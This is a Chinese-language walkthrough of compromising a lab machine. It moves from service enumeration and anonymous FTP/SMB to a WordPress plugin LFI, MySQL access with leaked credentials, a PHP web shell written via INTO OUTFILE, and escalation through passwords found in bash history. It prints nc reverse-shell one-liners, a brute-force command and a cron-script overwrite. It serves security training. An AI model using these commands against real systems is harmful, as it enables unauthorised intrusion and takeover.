# 列舉
```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ rustscan -a 192.168.133.148 -- -sV

........

PORT      STATE SERVICE     REASON         VERSION
21/tcp    open  ftp         syn-ack ttl 61 vsftpd 2.0.8 or later
22/tcp    open  ssh         syn-ack ttl 61 OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
53/tcp    open  tcpwrapped  syn-ack ttl 61
80/tcp    open  http        syn-ack ttl 61 PHP cli server 5.5 or later
139/tcp   open  netbios-ssn syn-ack ttl 61 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
666/tcp   open  pkzip-file  syn-ack ttl 61 .ZIP file
3306/tcp  open  mysql       syn-ack ttl 61 MySQL 5.7.12-0ubuntu1
12380/tcp open  http        syn-ack ttl 61 Apache httpd 2.4.18 ((Ubuntu))
```

# FTP 匿名登入
- 使用 `anonymous` 成功匿名登入 ftp，發現其中一個 username `harry` 

	```bash
	┌──(kali㉿kali)-[~/Desktop/stepler]
	└─$ ftp 192.168.133.148                            
	Connected to 192.168.133.148.
	220-
	220-|-----------------------------------------------------------------------------------------|
	220-| Harry, make sure to update the banner when you get a chance to show who has access here |
	220-|-----------------------------------------------------------------------------------------|
	220-
	220 
	Name (192.168.133.148:kali): anonymous
	
	331 Please specify the password.
	Password: 
	230 Login successful.
	Remote system type is UNIX.
	Using binary mode to transfer files.
	ftp>
	```
> 
- 在目錄裡發現 `note`，下載回 kali 查看，發現兩個 username `elly`、`john`

	```bash
	ftp> ls
	550 Permission denied.
	200 PORT command successful. Consider using PASV.
	150 Here comes the directory listing.
	-rw-r--r--    1 0        0             107 Jun 03  2016 note
	226 Directory send OK.
	ftp> get note
	
	.........
	```
>
	```bash
	┌──(kali㉿kali)-[~/Desktop/stepler]
	└─$ cat note                                    
	Elly, make sure you update the payload information. Leave it in your FTP account once your are done, John.
	```

# SMB 訪客(Guest)登入
- 使用 `enum4linux` 發現目標允許 `guest` 登入，並列舉了共享資料夾
	```bash
	┌──(kali㉿kali)-[~/Desktop/stepler]
	└─$ enum4linux 192.168.133.148
	
	........
	
	        
	        Sharename       Type      Comment
	        ---------       ----      -------
	        print$          Disk      Printer Drivers
	        kathy           Disk      Fred, What are we doing here?
	        tmp             Disk      All temporary files should be stored here
	        IPC$            IPC       IPC Service (red server (Samba, Ubuntu))
	```
>
- 使用 `impacker-smbclient` 登入目標 smb (139 port)，並在 `kathy` 資料夾裡發現 3 個檔案
	```bash
	┌──(kali㉿kali)-[~/Desktop/stepler]
	└─$ impacket-smbclient guest@192.168.133.148 -p 139
	Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
	
	Password:
	Type help for list of commands
	# use kathy
	# ls
	drw-rw-rw-          0  Fri Jun  3 12:52:52 2016 .
	drw-rw-rw-          0  Mon Jun  6 17:39:56 2016 ..
	drw-rw-rw-          0  Sun Jun  5 11:02:27 2016 kathy_stuff
	drw-rw-rw-          0  Sun Jun  5 11:04:14 2016 backup
	# cd kathy_stuff
	# ls
	drw-rw-rw-          0  Sun Jun  5 11:02:27 2016 .
	drw-rw-rw-          0  Fri Jun  3 12:52:52 2016 ..
	-rw-rw-rw-         64  Sun Jun  5 11:02:27 2016 todo-list.txt
	# cd ../backup
	# ls
	drw-rw-rw-          0  Sun Jun  5 11:04:14 2016 .
	drw-rw-rw-          0  Fri Jun  3 12:52:52 2016 ..
	-rw-rw-rw-       5961  Sun Jun  5 11:03:45 2016 vsftpd.conf
	-rw-rw-rw-    6321767  Mon Apr 27 13:14:45 2015 wordpress-4.tar.gz
	```
>
- 將檔案下載到 kali 查看，發現關鍵訊息 `Initech`
	```bash
	┌──(kali㉿kali)-[~/Desktop/stepler]
	└─$ cat todo-list.txt 
	I'm making sure to backup anything important for Initech, Kathy
	```

# Web 列舉
- 使用 `whatweb` 列舉目標，發現 `400 Bad Request`，目標可能強制使用 `https` ，且 Title 裡提到了 username `tim` 以及關鍵字  `Initech`
	```bash
	┌──(kali㉿kali)-[~/Desktop/stepler]
	└─$ whatweb http://192.168.133.148:12380/
	http://192.168.133.148:12380/ [400 Bad Request] Apache[2.4.18], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[192.168.133.148], Title[Tim, we need to-do better next year for Initech], UncommonHeaders[dave], X-UA-Compatible[IE=edge]
	```
>
- 改用 `https` 列舉目標，Status Code 變為 `200 OK`，沒看到有用資訊
	```bash
	┌──(kali㉿kali)-[~/Desktop/stepler]
	└─$ whatweb https://192.168.133.148:12380/
	https://192.168.133.148:12380/ [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[192.168.133.148], UncommonHeaders[dave] 
	```
>
- 使用 `dirsearch` 掃描目錄，發現 `robots.txt`
```bash
┌──(kali㉿kali)-[~/Desktop/stepler]
└─$ dirsearch -u https://192.168.133.148:12380/ -i 200

.........

[09:41:30] 200 -    3KB - /phpmyadmin/doc/html/index.html                   
[09:41:30] 200 -    3KB - /phpmyadmin/index.php                             
[09:41:30] 200 -    3KB - /phpmyadmin/                                      
[09:41:36] 200 -   59B  - /robots.txt

.........
```
>
- 查看 `robots.txt`，發現 `/blogblog/`

	![](image/Pasted%20image%2020260620215543.png)
>
- 查看 `/blogblog/`，發現目標使用 `wordpress`

	![](image/Pasted%20image%2020260620215956.png)
>
- 使用 `wpscan`掃描，發現目標使用 `advanced-videos`
	```bash
	┌──(kali㉿kali)-[~/Desktop/stepler]
	└─$ wpscan --url https://192.168.133.148:12380/blogblog/ -e ap --plugins-detection aggressive --disable-tls-checks -o wpscan
	  
	┌──(kali㉿kali)-[~/Desktop/stepler]
	└─$ cat wpscan
	
	.......
	
	[i] Plugin(s) Identified:
	
	[+] advanced-video-embed-embed-videos-or-playlists
	 | Location: https://192.168.133.148:12380/blogblog/wp-content/plugins/advanced-video-embed-embed-videos-or-playlists/
	 | Latest Version: 1.0 (up to date)
	 | Last Updated: 2015-10-14T13:52:00.000Z
	 | Readme: https://192.168.133.148:12380/blogblog/wp-content/plugins/advanced-video-embed-embed-videos-or-playlists/readme.txt
	 | [!] Directory listing is enabled
	 |
	 | Found By: Known Locations (Aggressive Detection)
	 |  - https://192.168.133.148:12380/blogblog/wp-content/plugins/advanced-video-embed-embed-videos-or-playlists/, status: 200
	 |
	 | Version: 1.0 (80% confidence)
	 | Found By: Readme - Stable Tag (Aggressive Detection)
	 |  - https://192.168.133.148:12380/blogblog/wp-content/plugins/advanced-video-embed-embed-videos-or-playlists/readme.txt
	
	......
	```
>
- 使用 `searchsploit` 搜尋相關漏洞，找到一個 LFI 漏洞
	```bash
	┌──(kali㉿kali)-[~/Desktop/stepler]
	└─$ searchsploit advanced video
	---------------------------------------------------------------------------- ---------------------------------
	 Exploit Title                                                              |  Path
	---------------------------------------------------------------------------- ---------------------------------
	WordPress Plugin Advanced Video 1.0 - Local File Inclusion                  | php/webapps/39646.py
	---------------------------------------------------------------------------- ---------------------------------
	Shellcodes: No Results
	```
>
- `seachsploit` 裡的 POC 版本過舊有缺件，在 github 找到其他 [POC](https://github.com/gtech/39646)

	![](image/Pasted%20image%2020260621020414.png)
>
- 將 POC 內 `url` 參數改為目標網址並執行，預設為讀取目標內 `wp-config.php` 
	```bash
	┌──(kali㉿kali)-[~/Desktop/stepler]
	└─$ python3 39646.py
	
	.........
	
	** MySQL settings - You can get this info from your web host ** //\n/** The name of the database for WordPress */\ndefine(\'DB_NAME\', \'wordpress\');\n\n/** MySQL database username */\ndefine(\'DB_USER\', \'root\');\n\n/** MySQL database password */\ndefine(\'DB_PASSWORD\', \'plbkac\');\n\n/** MySQL hostname */\ndefine(\'DB_HOST\', \'localhost\');\n\n/
	
	.........
	```
>
	```bash
	DB_NAME:     wordpress
	DB_USER:     root
	DB_PASSWORD: plbkac
	DB_HOST:     localhost
	```

# MySQL
- 使用 credential 登入 MySQL
	```bash
	┌──(kali㉿kali)-[~/Desktop/stepler]
	└─$ mysql -u root -p'plbkac' -h 192.168.133.148 --skip-ssl
	Welcome to the MariaDB monitor.  Commands end with ; or \g.
	Your MySQL connection id is 9
	Server version: 5.7.12-0ubuntu1 (Ubuntu)
	
	Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
	
	Support MariaDB developers by giving a star at https://github.com/MariaDB/server
	Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
	
	MySQL [(none)]> show databases;
	+--------------------+
	| Database           |
	+--------------------+
	| information_schema |
	| loot               |
	| mysql              |
	| performance_schema |
	| phpmyadmin         |
	| proof              |
	| sys                |
	| wordpress          |
	+--------------------+
	8 rows in set (0.070 sec)
	```
>
- 在 `wordpress` database 裡面找到 `wp_users` table

	```bash
	MySQL [(none)]> use wordpress;
	Reading table information for completion of table and column names
	You can turn off this feature to get a quicker startup with -A
	
	Database changed
	MySQL [wordpress]> show tables;
	+-----------------------+
	| Tables_in_wordpress   |
	+-----------------------+
	| wp_commentmeta        |
	| wp_comments           |
	| wp_links              |
	| wp_options            |
	| wp_postmeta           |
	| wp_posts              |
	| wp_term_relationships |
	| wp_term_taxonomy      |
	| wp_terms              |
	| wp_usermeta           |
	| wp_users              |
	+-----------------------+
	11 rows in set (0.058 sec)
	```
>
- 在 `wp_users` 列出了 wordpress 的所有 username 及 password，可以暴力破解，但可嘗試其他方法

	```bash
	MySQL [wordpress]> select * from wp_users;
	+----+------------+------------------------------------+---------------+-----------------------+------------------+---------------------+---------------------+-------------+-----------------+
	| ID | user_login | user_pass                          | user_nicename | user_email            | user_url         | user_registered     | user_activation_key | user_status | display_name    |
	+----+------------+------------------------------------+---------------+-----------------------+------------------+---------------------+---------------------+-------------+-----------------+
	|  1 | John       | $P$B7889EMq/erHIuZapMB8GEizebcIy9. | john          | john@red.localhost    | http://localhost | 2016-06-03 23:18:47 |                     |           0 | John Smith      |
	|  2 | Elly       | $P$BlumbJRRBit7y50Y17.UPJ/xEgv4my0 | elly          | Elly@red.localhost    |                  | 2016-06-05 16:11:33 |                     |           0 | Elly Jones      |
	|  3 | Peter      | $P$BTzoYuAFiBA5ixX2njL0XcLzu67sGD0 | peter         | peter@red.localhost   |                  | 2016-06-05 16:13:16 |                     |           0 | Peter Parker    |
	|  4 | barry      | $P$BIp1ND3G70AnRAkRY41vpVypsTfZhk0 | barry         | barry@red.localhost   |                  | 2016-06-05 16:14:26 |                     |           0 | Barry Atkins    |
	|  5 | heather    | $P$Bwd0VpK8hX4aN.rZ14WDdhEIGeJgf10 | heather       | heather@red.localhost |                  | 2016-06-05 16:18:04 |                     |           0 | Heather Neville |
	|  6 | garry      | $P$BzjfKAHd6N4cHKiugLX.4aLes8PxnZ1 | garry         | garry@red.localhost   |                  | 2016-06-05 16:18:23 |                     |           0 | garry           |
	|  7 | harry      | $P$BqV.SQ6OtKhVV7k7h1wqESkMh41buR0 | harry         | harry@red.localhost   |                  | 2016-06-05 16:18:41 |                     |           0 | harry           |
	|  8 | scott      | $P$BFmSPiDX1fChKRsytp1yp8Jo7RdHeI1 | scott         | scott@red.localhost   |                  | 2016-06-05 16:18:59 |                     |           0 | scott           |
	|  9 | kathy      | $P$BZlxAMnC6ON.PYaurLGrhfBi6TjtcA0 | kathy         | kathy@red.localhost   |                  | 2016-06-05 16:19:14 |                     |           0 | kathy           |
	| 10 | tim        | $P$BXDR7dLIJczwfuExJdpQqRsNf.9ueN0 | tim           | tim@red.localhost     |                  | 2016-06-05 16:19:29 |                     |           0 | tim             |
	| 11 | ZOE        | $P$B.gMMKRP11QOdT5m1s9mstAUEDjagu1 | zoe           | zoe@red.localhost     |                  | 2016-06-05 16:19:50 |                     |           0 | ZOE             |
	| 12 | Dave       | $P$Bl7/V9Lqvu37jJT.6t4KWmY.v907Hy. | dave          | dave@red.localhost    |                  | 2016-06-05 16:20:09 |                     |           0 | Dave            |
	| 13 | Simon      | $P$BLxdiNNRP008kOQ.jE44CjSK/7tEcz0 | simon         | simon@red.localhost   |                  | 2016-06-05 16:20:35 |                     |           0 | Simon           |
	| 14 | Abby       | $P$ByZg5mTBpKiLZ5KxhhRe/uqR.48ofs. | abby          | abby@red.localhost    |                  | 2016-06-05 16:20:53 |                     |           0 | Abby            |
	| 15 | Vicki      | $P$B85lqQ1Wwl2SqcPOuKDvxaSwodTY131 | vicki         | vicki@red.localhost   |                  | 2016-06-05 16:21:14 |                     |           0 | Vicki           |
	| 16 | Pam        | $P$BuLagypsIJdEuzMkf20XyS5bRm00dQ0 | pam           | pam@red.localhost     |                  | 2016-06-05 16:42:23 |                     |           0 | Pam             |
	+----+------------+------------------------------------+---------------+-----------------------+------------------+---------------------+---------------------+-------------+-----------------+
	16 rows in set (0.626 sec)
	```
>
- 使用 MySQL 寫入檔案，先確認 wordpress 根目錄，POC 內有提到讀取檔案的方法
	```bash
	┌──(kali㉿kali)-[~/Desktop/stepler]
	└─$ cat 39646.py | grep POC
	# POC - http://127.0.0.1/wordpress/wp-admin/admin-ajax.php?action=ave_publishPost&title=random&short=1&term=1&thumb=[FILEPATH]
	```
>
- 使用 `curl` 讀取一個不存在的檔案，回應顯示了 wordpress 的根目錄為 `/var/www/https/blogblog/`
	```bash
	┌──(kali㉿kali)-[~/Desktop/stepler]
	└─$ curl -k 'https://192.168.133.148:12380/blogblog/wp-admin/admin-ajax.php?action=ave_publishPost&title=random&short=1&term=1&thumb=test.txt' 
	<br />
	<b>Warning</b>:  file_get_contents(test.txt): failed to open stream: No such file or directory in <b>/var/www/https/blogblog/wp-content/plugins/advanced-video-embed-embed-videos-or-playlists/inc/classes/class.avePost.php</b> on line <b>78</b><br />
	https://192.168.133.148:12380/blogblog/?p=230 
	```
>
- 使用 `INTO OUTFILE` 將 web shell 寫進 wordpress 目錄
	```bash
	MySQL [wordpress]> select '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/https/blogblog/wp-content/uploads/shell.php';
	Query OK, 1 row affected (0.063 sec)
	```
>
	```bash
	┌──(kali㉿kali)-[~/Desktop/stepler]
	└─$ curl -k 'https://192.168.133.148:12380/blogblog/wp-content/uploads/shell.php?cmd=whoami'
	www-data
	```
>
- 使用 web shell 連回 reverse shell，並找到 local.txt
	```bash
	┌──(kali㉿kali)-[~/Desktop/stepler]
	└─$ curl -k 'https://192.168.133.148:12380/blogblog/wp-content/uploads/shell.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%20192.168.45.159%204444%20%3E%2Ftmp%2Ff'
	```
>
	```bash
	┌──(kali㉿kali)-[~/Desktop/stepler]
	└─$ rlwrap nc -lvnp 4444
	listening on [any] 4444 ...
	connect to [192.168.45.159] from (UNKNOWN) [192.168.133.148] 39884
	sh: 0: can't access tty; job control turned off
	$ whoami
	www-data
	$ find /home -type f -name local.txt 2>/dev/null
	/home/local.txt
	```
# 提權
- 發現所有 user 的目錄權限皆為 755 (`drwxr-xr-x`)，代表 `www-data` 可以搜尋每個 user 目錄內的檔案
	```bash
	$ SHELL=/bin/bash script -q /dev/null
	www-data@red:/var/www/https/blogblog/wp-content/uploads$ cd /home
	cd /home
	www-data@red:/home$ ls -al
	ls -al
	total 132
	drwxr-xr-x 32 root       root       4096 Jun  9  2021 .
	drwxr-xr-x 22 root       root       4096 Jun  7  2016 ..
	drwxr-xr-x  2 AParnell   AParnell   4096 May  5  2021 AParnell
	drwxr-xr-x  2 CCeaser    CCeaser    4096 Jun  5  2016 CCeaser
	drwxr-xr-x  2 CJoo       CJoo       4096 May  5  2021 CJoo
	drwxr-xr-x  2 DSwanger   DSwanger   4096 May  5  2021 DSwanger
	drwxr-xr-x  2 Drew       Drew       4096 May  5  2021 Drew
	drwxr-xr-x  2 ETollefson ETollefson 4096 May  5  2021 ETollefson
	drwxr-xr-x  2 Eeth       Eeth       4096 Jun  5  2016 Eeth
	drwxr-xr-x  2 IChadwick  IChadwick  4096 Jun  5  2016 IChadwick
	drwxr-xr-x  2 JBare      JBare      4096 May  5  2021 JBare
	drwxr-xr-x  2 JKanode    JKanode    4096 Jun  9  2021 JKanode
	drwxr-xr-x  2 JLipps     JLipps     4096 May  5  2021 JLipps
	drwxr-xr-x  2 LSolum     LSolum     4096 May  5  2021 LSolum
	drwxr-xr-x  2 LSolum2    LSolum2    4096 Jun  5  2016 LSolum2
	drwxr-xr-x  2 MBassin    MBassin    4096 May  5  2021 MBassin
	drwxr-xr-x  2 MFrei      MFrei      4096 May  5  2021 MFrei
	drwxr-xr-x  2 NATHAN     NATHAN     4096 May  5  2021 NATHAN
	drwxr-xr-x  2 RNunemaker RNunemaker 4096 May  5  2021 RNunemaker
	drwxr-xr-x  2 SHAY       SHAY       4096 May  5  2021 SHAY
	drwxr-xr-x  2 SHayslett  SHayslett  4096 May  5  2021 SHayslett
	drwxr-xr-x  2 SStroud    SStroud    4096 May  5  2021 SStroud
	drwxr-xr-x  2 Sam        Sam        4096 Jun  5  2016 Sam
	drwxr-xr-x  2 Taylor     Taylor     4096 May  5  2021 Taylor
	drwxr-xr-x  2 elly       elly       4096 May  5  2021 elly
	drwxr-xr-x  2 jamie      jamie      4096 May  5  2021 jamie
	drwxr-xr-x  2 jess       jess       4096 May  5  2021 jess
	drwxr-xr-x  2 kai        kai        4096 May  5  2021 kai
	-r--r--r--  1 www-data   www-data     33 Jun 20 19:16 local.txt
	drwxr-xr-x  2 mel        mel        4096 May  5  2021 mel
	drwxr-xr-x  3 peter      peter      4096 Jun  9  2021 peter
	drwxrwxrwx  2 www        www        4096 Jun  5  2016 www
	drwxr-xr-x  3 zoe        zoe        4096 May  5  2021 zoe
	```
>
- 搜尋每個 user 的指令歷史紀錄，發現 credential
	```bash
	www-data@red:/home$ find /home -type f -name .bash_history -exec cat {} \; 2>/dev/null
	<ome -type f -name .bash_history -exec cat {} \; 2>/dev/null                 
	exit
	free
	exit
	id
	whoami
	ls -lah
	pwd
	ps aux
	sshpass -p thisimypassword ssh JKanode@localhost
	apt-get install sshpass
	sshpass -p JZQuyIN5 ssh peter@localhost
	ps -ef
	top
	kill -9 3747
	exit
	exit
	exit
	exit
	whoami
	```
>
- 使用 `peter` 登入 ssh，執行 `sudo -l`，發現可以直接提權，成功取得 `root` 權限，並找到 proof.txt
	```bash
	┌──(kali㉿kali)-[~/Desktop/stepler]
	└─$ ssh peter@192.168.133.148
	-----------------------------------------------------------------
	~          Barry, don't forget to put a message here           ~
	-----------------------------------------------------------------
	peter@192.168.133.148's password: 
	Welcome back!
	
	
	red% sudo -l
	
	We trust you have received the usual lecture from the local System
	Administrator. It usually boils down to these three things:
	
	    #1) Respect the privacy of others.
	    #2) Think before you type.
	    #3) With great power comes great responsibility.
	
	[sudo] password for peter: 
	Matching Defaults entries for peter on red:
	    lecture=always, env_reset, mail_badpass,
	    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
	
	User peter may run the following commands on red:
	    (ALL : ALL) ALL
	red% sudo su
	➜  peter whoami
	root
	➜  peter ls /root 
	fix-wordpress.sh  flag.txt  issue  proof.txt  wordpress.sql
	```

# 補充

## 1. 替代初始存取路徑：WordPress 帳密爆破與外掛上傳 (Alternative Initial Access)

除了 LFI 漏洞以外，也可以透過 WordPress 的常規弱點進行利用：

1. **使用者列舉與密碼爆破**：
   使用 `wpscan` 列舉系統中的使用者，並使用 `rockyou.txt` 進行密碼暴力破解：
   ```bash
   # 列舉使用者
   wpscan --url https://192.168.133.148:12380/blogblog/ --disable-tls-checks --enumerate u

   # 使用 rockyou 密碼檔進行字典檔爆破
   wpscan --url https://192.168.133.148:12380/blogblog/ --disable-tls-checks --usernames john,peter,barry,heather,garry,elly,harry,scott,kathy,tim --passwords /usr/share/wordlists/rockyou.txt
   ```
   *   爆破結果能成功取得管理員（John Smith，帳號 `john`）的登入憑證。

2. **登入 WordPress 後台上傳惡意外掛**：
   *   存取 `https://192.168.133.148:12380/blogblog/wp-login.php` 並登入管理員帳號。
   *   進入 `Plugins` > `Add New` > `Upload Plugin`。
   *   上傳一個包含 PHP Reverse Shell 的 ZIP 壓縮檔（當後台提示需要 FTP 伺服器憑證時，可使用匿名帳號 `anonymous` / 空密碼，或直接留空跳過）。

3. **觸發 Web Shell**：
   *   上傳成功後，外掛檔案會被儲存至 WordPress 的上傳目錄下：
       `https://192.168.133.148:12380/blogblog/wp-content/uploads/`
   *   在本地端執行監聽（例如 `nc -lvnp 4444`），並透過瀏覽器或 `curl` 存取該上傳的 PHP Shell 檔案以觸發 Reverse Shell，取得 `www-data` 權限。

---

## 2. 替代提權路徑：定時任務指令碼可寫漏洞 (Cron Job Privilege Escalation)

除了透過 peter 使用者的 `.bash_history` 獲取密碼並利用 `sudo` 提權外，此靶機還存在一個定時任務的配置不當漏洞：

1. **尋找本機定時任務 (Cron Jobs)**：
   檢查 `/etc/` 目錄下的定時任務設定：
   ```bash
   find /etc/*cron* -type f -ls 2>/dev/null -exec cat {} \; > /tmp/cron.txt
   grep '*' /tmp/cron.txt
   ```
   發現 root 使用者每 5 分鐘會自動執行一次清理指令碼：
   `/usr/local/sbin/cron-logrotate.sh`

2. **檢查檔案權限**：
   ```bash
   ls -l /usr/local/sbin/cron-logrotate.sh
   ```
   發現該指令碼對 `other` 使用者具有**寫入 (write)** 權限，即任何人（包括 `www-data`）都可以修改它。

3. **注入惡意 Reverse Shell 指令**：
   往該指令碼中寫入逆向連線指令（此處以 nc 做示範）：
   ```bash
   echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <KALI_IP> 4444 >/tmp/f" > /usr/local/sbin/cron-logrotate.sh
   ```

4. **取得 Root 權限**：
   在 Kali 上執行監聽並等待最多 5 分鐘，定時任務執行時即會以 root 權限回傳一個 Shell：
   ```bash
   nc -lvnp 4444
   # 成功連線後執行 whoami 即為 root
   ```
